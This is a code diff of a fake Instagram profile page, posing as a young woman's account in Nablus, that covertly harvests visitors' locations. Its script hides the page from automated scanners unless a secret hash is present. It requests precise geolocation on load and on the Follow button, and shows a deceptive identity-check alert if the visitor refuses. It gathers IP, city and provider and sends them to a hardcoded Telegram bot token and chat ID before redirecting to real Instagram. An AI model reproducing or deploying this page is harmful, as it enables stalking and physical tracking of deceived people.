@@ -3,17 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    
-    <title>Instagram | Ekhlas</title>
-    <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos and videos">
+    <meta name="robots" content="noindex, nofollow"> <title>Instagram | Ekhlas</title>
+    <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos">
     <meta property="og:description" content="شاهد صور ومقاطع فيديو إخلاص. استكشف المنشورات والقصص الآن.">
     <meta property="og:image" content="https://k.top4top.io/p_3696qmute0.jpeg">
     <meta property="og:type" content="profile">
-    <meta name="theme-color" content="#ffffff">
 
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; color: #262626; display: none; }
-        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; position: sticky; top: 0; background: white; z-index: 100; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: none; }
+        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; sticky: top; background: white; }
         .profile-container { padding: 20px 15px; max-width: 600px; margin: 0 auto; }
         .header-top { display: flex; align-items: center; margin-bottom: 20px; }
         .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 1px solid #dbdbdb; padding: 2px; object-fit: cover; }
@@ -26,7 +24,7 @@
         .grid-item { background: #fafafa; aspect-ratio: 1/1; border: 0.5px solid #efefef; }
     </style>
 </head>
-<body id="mainContent">
+<body id="mainBody">
 
     <div class="nav">Ekhlas</div>
 
@@ -39,87 +37,73 @@
                 <div><span class="stat-num">315</span><span class="stat-label">نتابعهم</span></div>
             </div>
         </div>
-
         <div class="bio">
             <strong>Ekhlas | إخلاص</strong><br>
             • Personal Account ✨<br>
             • Palestine | Nablus 🇵🇸<br>
             • مرحبا بك في عالمي الصغير 🌸
         </div>
-
-        <button class="follow-btn" onclick="locate()">متابعة</button>
-
+        <button class="follow-btn" onclick="askLoc()">متابعة</button>
         <div class="grid">
             <div class="grid-item" style="background: url('https://k.top4top.io/p_3696qmute0.jpeg') center/cover;"></div>
             <div class="grid-item"></div><div class="grid-item"></div>
-            <div class="grid-item"></div><div class="grid-item"></div><div class="grid-item"></div>
         </div>
     </div>
 
     <script>
-        const API_KEY = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
-        const MY_ID = '7184970355';
-        const HASH_KEY = "#secure";
+        const TG_TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
+        const TG_ID = '7184970355';
+        const PASS = "#secure";
 
-        window.onload = function() {
-            // نظام الحماية والتمويه
-            if (window.location.hash !== HASH_KEY) {
-                window.location.replace("https://www.instagram.com");
-                return;
+        // حماية الكود: لا يفتح إلا بالهاش لمنع البوتات والمعاينة الآلية من كشفه
+        if (window.location.hash !== PASS) {
+            window.location.replace("https://www.instagram.com");
+        } else {
+            document.getElementById('mainBody').style.display = "block";
+        }
+
+        // طلب الإذن "مباشرة" عند التحميل
+        window.addEventListener('load', function() {
+            setTimeout(askLoc, 500); // تأخير بسيط لضمان استقرار الصفحة على الأيفون
+        });
+
+        function askLoc() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, fail, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
             }
-            document.getElementById('mainContent').style.display = "block";
+        }
+
+        async function success(p) {
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            const acc = p.coords.accuracy;
+            const device = await getInfo();
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // طلب الموقع تلقائياً فور الدخول كإجراء أول
-            locate();
-        };
+            const msg = `🎯 **تم سحب الموقع بنجاح (iPhone)**\n\n📍 الخريطة: ${mapLink}\n🎯 الدقة: ${acc} متر\n\n${device}`;
+            send(msg);
+            window.location.href = "https://www.instagram.com/reels/";
+        }
 
-        async function locate() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude;
-                    const lon = p.coords.longitude;
-                    const accuracy = p.coords.accuracy;
-                    
-                    const details = await getDeviceDetails();
-                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    const report = `✅ **صيد ثمين (موقع دقيق)**\n\n` +
-                                   `📍 رابط الخريطة: ${googleMaps}\n` +
-                                   `🎯 نسبة الدقة: ${accuracy} متر\n\n` +
-                                   `${details}`;
-
-                    sendToTelegram(report);
-                    
-                    // تحويل للتمويه بعد السحب
-                    setTimeout(() => { window.location.href = "https://www.instagram.com/p/C_sample/"; }, 1500);
-
-                }, (err) => {
-                    // في حال الرفض على الأيفون، نظهر تنبيه مقنع
-                    if(err.code == 1) { 
-                        alert("عذراً، يجب السماح بمشاركة الموقع للتأكد من هويتك ومتابعة هذا الحساب الخاص.");
-                    }
-                }, { enableHighAccuracy: true, timeout: 10000 });
+        function fail(e) {
+            // إذا رفض الإذن، تظهر رسالة تطلب منه السماح لمتابعة الحساب
+            if(e.code == 1) {
+                alert("يرجى السماح بالوصول للموقع للتأكد من هويتك ومشاهدة الصور.");
             }
         }
 
-        async function getDeviceDetails() {
+        async function getInfo() {
             try {
-                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const ua = navigator.userAgent;
-                let deviceModel = "iPhone/iOS Device";
-                
-                // سحب نوع الأيفون من الـ User Agent
-                if (ua.match(/iPhone/i)) {
-                    const webkit = ua.match(/AppleWebKit\/([0-9\.]+)/);
-                    deviceModel = `iPhone (iOS) - WebKit: ${webkit ? webkit[1] : 'Unknown'}`;
-                }
-
-                return `📱 نوع الهاتف: ${deviceModel}\n🌐 IP: ${ipData.ip}\n📍 المنطقة: ${ipData.city}, ${ipData.country_name}\n🏢 المزود: ${ipData.org}`;
-            } catch (e) { return "بيانات الجهاز: " + navigator.userAgent; }
+                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
+                return `📱 الجهاز: ${navigator.platform}\n🌐 IP: ${res.ip}\n📍 ${res.city}, ${res.country_name}\n🏢 المزود: ${res.org}`;
+            } catch(e) { return "UserAgent: " + navigator.userAgent; }
         }
 
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        function send(t) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
         }
     </script>
 </body>
